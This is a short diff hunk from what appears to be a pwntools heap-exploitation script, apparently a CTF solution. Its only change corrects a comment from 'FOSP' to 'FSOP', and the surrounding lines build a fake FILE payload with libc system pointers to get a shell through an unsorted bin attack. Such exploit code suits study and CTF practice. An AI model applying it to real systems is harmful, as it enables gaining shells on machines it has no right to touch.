@@ -79,7 +79,7 @@ payload += p64(0) + p64(1)
 payload = payload.ljust(0xd8, "\x00")
 payload += p64(heap_addr + 0x20*7+0x10 + 0xd8 + 0x8)+p64(libc.symbols['system'])*4
 
-# use unsorted bin attack and FOSP to getshell
+# use unsorted bin attack and FSOP to getshell
 edit(0,data+payload)
 sla("choice :","1");sla("page :",str(0x10))
 io.interactive()
